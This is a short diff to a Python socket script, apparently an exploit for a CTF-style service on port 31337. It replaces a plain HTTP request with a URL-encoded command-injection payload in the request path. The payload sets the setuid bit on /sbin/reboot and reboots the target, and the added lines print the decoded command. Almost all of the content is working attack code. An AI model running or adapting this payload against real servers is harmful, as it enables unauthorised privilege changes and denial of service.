@@ -6,7 +6,7 @@ port = 31337
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host, port))
 
-s.send("GET / HTTP/1.1\r\nhost: extern\r\npeter: ahsn\r\n\r\n".encode("utf-8"))
+s.send("GET %2F%20%26%20chmod%20%2Bs%20%2Fsbin%2Freboot%20%26%20reboot HTTP/1.1\r\nhost: extern\r\n\r\n".encode("utf-8"))
 
 received = ""
 while 1:
@@ -19,3 +19,7 @@ while 1:
 print(repr(received))
 
 s.close()
+
+import urllib.parse
+print(urllib.parse.unquote("%2F%20%26%20chmod%20%2Bs%20%2Fsbin%2Freboot%20%26%20reboot"))
+
